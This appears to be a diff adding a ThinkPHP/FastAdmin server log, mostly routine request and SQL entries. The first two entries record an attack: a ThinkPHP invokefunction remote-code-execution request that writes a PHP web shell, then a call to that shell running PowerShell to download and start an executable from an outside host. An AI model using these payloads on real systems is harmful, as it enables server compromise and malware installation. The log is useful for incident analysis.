+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-04-05T19:42:44+08:00 ] 47.92.116.24 GET 47.92.113.32/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^<?php%20$action%20=%20$_GET['xcmd'];system($action);?^>>hydra.php
+[运行时间：0.019158s] [吞吐率：52.20req/s] [内存消耗：2,154.18kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000022s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001809s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001826s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '47.92.113.32',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'http://47.92.113.32:443/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo ^<?php $action = $_GET[\'xcmd\'];system($action);?^>>hydra.php',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'connection' => 'Keep-Alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000110s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-04-05T19:42:44+08:00 ] 47.92.116.24 GET 47.92.113.32/public/hydra.php?xcmd=cmd.exe%20/c%20powershell%20(new-object%20System.Net.WebClient).DownloadFile('http://fid.hognoob.se/download.exe','C:/Windows/temp/ffxghxaevlbpgza9973.exe');start%20C:/Windows/temp/ffxghxaevlbpgza9973.exe
+[运行时间：0.022917s] [吞吐率：43.64req/s] [内存消耗：2,154.68kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000028s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002784s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002808s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '404',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => '47.92.113.32',
+  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
+  'referer' => 'http://47.92.113.32:443/public/hydra.php?xcmd=cmd.exe /c powershell (new-object System.Net.WebClient).DownloadFile(\'http://fid.hognoob.se/download.exe\',\'C:/Windows/temp/ffxghxaevlbpgza9973.exe\');start C:/Windows/temp/ffxghxaevlbpgza9973.exe',
+  'accept-language' => 'zh-cn',
+  'accept' => '*/*',
+  'connection' => 'Keep-Alive',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000159s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-04-05T20:36:12+08:00 ] 1.197.234.9 HEAD www.chinafeifang.com/
+[运行时间：0.041480s] [吞吐率：24.11req/s] [内存消耗：4,879.99kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000019s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.001858s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.001874s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.chinafeifang.com',
+  'accept' => '*/*',
+  'user-agent' => 'Chrome/57',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001194s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000153s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000387s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000659s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000242s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000217s ]
+---------------------------------------------------------------
+[ 2019-04-05T23:55:24+08:00 ] 101.249.206.43 HEAD www.chinafeifang.com/
+[运行时间：0.043003s] [吞吐率：23.25req/s] [内存消耗：4,879.99kb] [文件加载：143]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000020s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run \addons\epay\Epay @app_init [ RunTime:0.002044s ]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.002063s ]
+[ info ] [ LANG ] /www/wwwroot/didi.xlove99.top/thinkphp/lang/zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '',
+    1 => NULL,
+    2 => NULL,
+  ),
+)
+[ info ] [ HEADER ] array (
+  'host' => 'www.chinafeifang.com',
+  'accept' => '*/*',
+  'user-agent' => 'Chrome/57',
+  'cache-control' => 'no-cache',
+  'pragma' => 'no-cache',
+  'content-type' => '',
+  'content-length' => '',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.001346s ]
+[ info ] [ DB ] INIT mysql
+[ info ] [ RUN ] app\wap\controller\Index->index[ /www/wwwroot/didi.xlove99.top/application/wap/controller/Index.php ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ BEHAVIOR ] Run \addons\loginvideo\Loginvideo @response_send [ RunTime:0.000147s ]
+[ info ] [ LOG ] INIT File
+[ sql ] [ DB ] CONNECT:[ UseTime:0.000362s ] mysql:host=127.0.0.1;dbname=didi_project;charset=utf8
+[ sql ] [ SQL ] SHOW COLUMNS FROM `fa_config` [ RunTime:0.000786s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` [ RunTime:0.000220s ]
+[ sql ] [ SQL ] SELECT `id`,`name`,`group`,`value` FROM `fa_config` WHERE  `group` = 'weixin' [ RunTime:0.000222s ]
